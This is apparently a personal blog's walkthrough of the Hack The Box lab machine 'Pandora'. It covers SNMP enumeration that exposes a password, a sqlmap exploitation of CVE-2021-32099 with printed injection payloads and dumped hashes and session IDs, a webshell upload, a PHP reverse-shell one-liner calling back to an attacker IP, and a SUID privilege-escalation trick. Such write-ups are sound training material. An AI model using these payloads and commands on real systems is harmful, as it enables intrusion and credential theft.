<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="[HTB] Pandora" /><meta property="og:locale" content="en" /><meta name="description" content="Infosec blog" /><meta property="og:description" content="Infosec blog" /><link rel="canonical" href="isntma.github.io/machines/htb/pandora" /><meta property="og:url" content="isntma.github.io/machines/htb/pandora" /><meta property="og:site_name" content="ISntMA" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-23T18:25:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="[HTB] Pandora" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-23T18:25:00+02:00","datePublished":"2022-05-23T18:25:00+02:00","description":"Infosec blog","headline":"[HTB] Pandora","mainEntityOfPage":{"@type":"WebPage","@id":"isntma.github.io/machines/htb/pandora"},"url":"isntma.github.io/machines/htb/pandora"}</script><title>[HTB] Pandora | ISntMA</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ISntMA"><meta name="application-name" content="ISntMA"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ISntMA</a></div><div class="site-subtitle font-italic">Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/curso/" class="nav-link"> <i class="fa-fw fas fa-book-open ml-xl-3 mr-xl-3 unloaded"></i> <span>CURSO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/isntma" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/987149" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://tryhackme.com/p/isntma" aria-label="tryhackme" target="_blank" rel="noopener"> <i class="fas fa-cloud"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['isnt.ma','tuta.io'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>[HTB] Pandora</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>[HTB] Pandora</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/isntma">ISntMA</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1653323100" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-23 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1916 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/machines/htb/pandora/banner.png" alt="banner" data-proofer-ignore></p><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">‚ùØ nmap -sV -Pn 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 13:20 EDT
Nmap scan report for Panda.HTB (10.10.11.136)
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds
</span></pre></table></code></div></div><blockquote><p>We see port 80 and 22 are open, so we have to go to the website.</p></blockquote><h3 id="domain"><span class="mr-2">Domain</span><a href="#domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>When we enter to the website this is what we see:</p><p><img data-src="/assets/img/machines/htb/pandora/web.png" alt="panda.htb" data-proofer-ignore> <em>We add the domain _panda.htb_ on hosts file and enter to the website</em></p><h3 id="nmap-1"><span class="mr-2">NMAP</span><a href="#nmap-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>I come back to <code class="language-plaintext highlighter-rouge">nmap</code> because I tried to find subdomains or directories with <code class="language-plaintext highlighter-rouge">knock</code> and <code class="language-plaintext highlighter-rouge">ffuf</code>, but found nothing. This time I use an UDP scan.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">‚ùØ sudo nmap -sU -top-ports=20 --open panda.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 13:53 EDT
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.061s latency).
rDNS record for 10.10.11.136: Panda.HTB
Not shown: 13 closed udp ports (port-unreach)
PORT STATE SERVICE
123/udp open|filtered ntp
161/udp open snmp
162/udp open|filtered snmptrap
631/udp open|filtered ipp
1900/udp open|filtered upnp
4500/udp open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
</span></pre></table></code></div></div><blockquote><p>So many ports <strong>open|filtered</strong> but only one <strong>open</strong>, this is the snmp port.</p></blockquote><p>Let‚Äôs look at some information about that port.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">‚ùØ sudo nmap -sU -sV -p 161 panda.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-17 14:01 EDT
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.059s latency).
rDNS record for 10.10.11.136: Panda.HTB

PORT STATE SERVICE VERSION
</span><span class="gp">161/udp open snmp SNMPv1 server;</span><span class="w"> </span>net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
<span class="go">Service Info: Host: pandora

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
</span></pre></table></code></div></div><blockquote><p>We need to remember <code class="language-plaintext highlighter-rouge">public</code> because it is the community string.</p></blockquote><h3 id="snmp"><span class="mr-2">SNMP</span><a href="#snmp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Investigating a little bit I found a tool in this <a href="https://pentesting.one2bla.me/enumeration/service-enumeration">website</a> called <code class="language-plaintext highlighter-rouge">snmpwalk</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>snmpwalk -c public -v1 panda.htb | tee snmpwalk1
</pre></table></code></div></div><p>Now let‚Äôs see the <code class="language-plaintext highlighter-rouge">snmpwalk1</code> file.</p><div file="./snmpwalk1" class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="./snmpwalk1"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>...
iso.3.6.1.2.1.25.4.2.1.5.876 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.880 = STRING: "-f"
...
</pre></table></code></div></div><blockquote><p>Ohhh, we see an user and a password here!</p></blockquote><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The latest credentials seems to work for the ssh, let‚Äôs try:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">‚ùØ ssh daniel@10.10.11.136
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation: https://help.ubuntu.com
 * Management: https://landscape.canonical.com
 * Support: https://ubuntu.com/advantage

</span><span class="c">...
</span><span class="go">
Last login: Tue May 17 18:27:07 2022 from 10.10.16.21

</span><span class="gp">daniel@pandora:~$</span><span class="w">
</span></pre></table></code></div></div><blockquote><p>And‚Ä¶ we are in!</p></blockquote><p>The first thing is an nmap to discover what services are running in here:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">daniel@pandora:~$</span><span class="w"> </span>nmap localhost
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-17 18:41 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000059s latency).
Other addresses for localhost (not scanned): ::1
rDNS record for 127.0.0.1: localhost.localdomain
Not shown: 997 closed ports
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
3306/tcp open mysql

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
</span></pre></table></code></div></div><blockquote><p>There is a website and a database in here‚Ä¶</p></blockquote><p>Taking a look at the configuration of the website can also be helpful:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">daniel@pandora:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/apache2/sites-enabled/pandora.conf 
<span class="gp">&lt;VirtualHost localhost:80&gt;</span><span class="w">
</span><span class="go">  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
</span><span class="gp">  &lt;Directory /var/www/pandora&gt;</span><span class="w">
</span><span class="go">    AllowOverride All
</span><span class="gp">  &lt;/Directory&gt;</span><span class="w">
</span><span class="go">  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</span><span class="gp">&lt;/VirtualHost&gt;</span><span class="w">
</span></pre></table></code></div></div><blockquote><p>There seems to be an user called matt:</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">daniel@pandora:~$</span><span class="w"> </span><span class="nb">ls</span> /home/matt/
<span class="go">tar user.txt
</span><span class="gp">daniel@pandora:~$</span><span class="w"> </span><span class="nb">cat</span> /home/matt/user.txt 
<span class="go">cat: /home/matt/user.txt: Permission denied
</span></pre></table></code></div></div><blockquote><p>In matt home we see the FLAG user!</p></blockquote><h3 id="port_forwarding"><span class="mr-2">Port_forwarding</span><a href="#port_forwarding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>We need to see that website on a browser, so let‚Äôs do port forwarding with ssh.</p><p>In order to do this we need to follow the following command: <br /> <code class="language-plaintext highlighter-rouge">ssh -L local_port:dest_server_ip:remote_port ssh_server_hostname</code></p><p>For this case, it is like this: <br /> <code class="language-plaintext highlighter-rouge">ssh -L 8080:localhost:80 daniel@10.10.11.136</code></p><p>Now we can see the website in our browser.</p><p><img data-src="/assets/img/machines/htb/pandora/login.png" alt="login" data-proofer-ignore> <em>Login PandoraFMS</em></p><h3 id="vulnerability"><span class="mr-2">Vulnerability</span><a href="#vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Searching for PandoraFMS I found this SQL injection vulnerability:</p><ul><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32099">CVE-2021-32099</a>: A SQL injection vulnerability in the pandora_console component of Artica Pandora FMS 742 allows an unauthenticated attacker to upgrade his unprivileged session via the /include/chart_generator.php session_id parameter, leading to a login bypass.</ul><p>Let‚Äôs try this with sqlmap:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>‚ùØ sqlmap --url "http://localhost:8080/pandora_console/include/chart_generator.php?session_id=''"
        ___
       __H__
 ___ ___[)]_____ ___ ___ {1.6.5#stable}
|_ -| . [)] | .'| . |
|___|_ ["]_|_|_|__,| _|
      |_|V... |_| https://sqlmap.org


[*] starting @ 15:11:24 /2022-05-17/

...
GET parameter 'session_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 241 HTTP(s) requests:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: session_id=-9717' OR 2914=2914#

    Type: error-based
    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=''' OR (SELECT 5582 FROM(SELECT COUNT(*),CONCAT(0x717a7a6b71,(SELECT (ELT(5582=5582,1))),0x71716a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qXuw

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=''' AND (SELECT 6429 FROM (SELECT(SLEEP(5)))KdsF)-- bkmF
---
...

[*] ending @ 15:18:00 /2022-05-17/
</pre></table></code></div></div><blockquote><p>Is vulnerable!</p></blockquote><h3 id="sql-tables"><span class="mr-2">SQL Tables</span><a href="#sql-tables" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>With this vulnerability we can see others tables of the database. Let‚Äôs have a look at the tables of pandora database.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre>‚ùØ sqlmap --url "http://localhost:8080/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables

Database: pandora
[178 tables]
+------------------------------------+
| ...                                |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| ...                                |
+------------------------------------+
</pre></table></code></div></div><blockquote><p>We need to see the <code class="language-plaintext highlighter-rouge">tpassword_history</code> and <code class="language-plaintext highlighter-rouge">tsessions_php</code> table!</p></blockquote><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>‚ùØ sqlmap --url "http://localhost:8080/pandora_console/include/chart_generator.php?session_id=''" -T tpassword_history --dump

Database: pandora
Table: tpassword_history
[2 entries]

id_user -&gt; matt ; password -&gt; f655f807365b6dc602b31ab3d6d43acc
id_user -&gt; daniel; password -&gt; 76323c174bd49ffbbdedf678f6cc89a6
</pre></table></code></div></div><blockquote><p>I changed the table to make it look good. However, nothing is taken out of these hashes, I have gone through crackstation and does not return anything.</p></blockquote><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>‚ùØ sqlmap --url "http://localhost:8080/pandora_console/include/chart_generator.php?session_id=''" -T tsessions_php --dump

Database: pandora
Table: tsessions_php
[50 entries]

...
id_session -&gt; avkp2qo6r8237spa3ohavnml52; id_usuario -&gt; admin
id_session -&gt; g4e01qdgk36mfdh90hvcc54umq; id_usuario -&gt; matt
id_session -&gt; hsftvg6j5m3vcmut6ln6ig8b0f; id_usuario -&gt; admin
...
</pre></table></code></div></div><blockquote><p>I changed this table too, we just need to focus on admin and matt user.</p></blockquote><h3 id="matt-access"><span class="mr-2">Matt access</span><a href="#matt-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>I tried with admin session but it didn‚Äôt work. Now changing session_id to g4e01qdgk36mfdh90hvcc54umq we enter like matt.</p><p><img data-src="/assets/img/machines/htb/pandora/matt.png" alt="matt" data-proofer-ignore> <em>matt session</em></p><p>Hmmm, if there is any way to upload files, we can upload a reverse shell to get access to the system.</p><p>There is not any fast method to get this working but‚Ä¶ Searching for a script to do that I found this <a href="https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py">one</a>.</p><p>This script is able to get us an admin session_id and upload a webshell, but it is giving me some problems.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="go">‚ùØ python exploit.py -t 127.0.0.1:8080 -f shell.php
URL: http://127.0.0.1:8080/pandora_console
[+] Sending Injection Payload
[+] Requesting Session
[+] Admin Session Cookie : 7pcmj1a43s35m1u6903br8213a
[+] Sending Payload 
[+] Respose : 200
[+] Pwned :)
</span></pre></table></code></div></div><blockquote><p>We are IN!</p></blockquote><h3 id="admin-access"><span class="mr-2">Admin access</span><a href="#admin-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Well, now, we need to get a bash shell‚Ä¶ After searching for a long time to get one I aam not able to do, so let‚Äôs get into admin session on the website.</p><p>Ok, it works!</p><p><img data-src="/assets/img/machines/htb/pandora/admin.png" alt="admin" data-proofer-ignore> <em>admin session</em></p><h3 id="reverse-shell"><span class="mr-2">Reverse shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Now that we are admin, we can upload files. We just search for a working webshell like <a href="https://raw.githubusercontent.com/JohnTroony/php-webshells/master/Collection/Simple-Webshell.php">this</a>, download and upload to the system.</p><p><img data-src="/assets/img/machines/htb/pandora/webshell.png" alt="webshell" data-proofer-ignore> <em>webshell uploaded</em></p><blockquote><p>This is going well‚Ä¶</p></blockquote><p>Finally, I get a bash shell with <code class="language-plaintext highlighter-rouge">nc -lnvp &lt;port&gt;</code> listening in my case 9042 port, and executing on the web shell this:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">php</span> <span class="o">-</span><span class="n">r</span> <span class="s1">'$sock=fsockopen("10.10.16.40",9042);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</pre></table></code></div></div><p>Is time to look into binaries with suid set. We just do <code class="language-plaintext highlighter-rouge">find / -perm -u=s -type f 2&gt;/dev/null</code> and we see <strong>/usr/bin/at</strong> on the list. So let‚Äôs go to <a href="https://gtfobins.github.io/#">gtfobins</a> and look for <em>at</em>.</p><p>We see with <code class="language-plaintext highlighter-rouge">echo "/bin/sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)" | at now; tail -f /dev/null</code> we can get a unrestricted shell. Let‚Äôs try‚Ä¶</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="go">‚ùØ nc -lnvp 9042
listening on [any] 9042 ...
connect to [10.10.16.40] from (UNKNOWN) [10.10.11.136] 58356
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
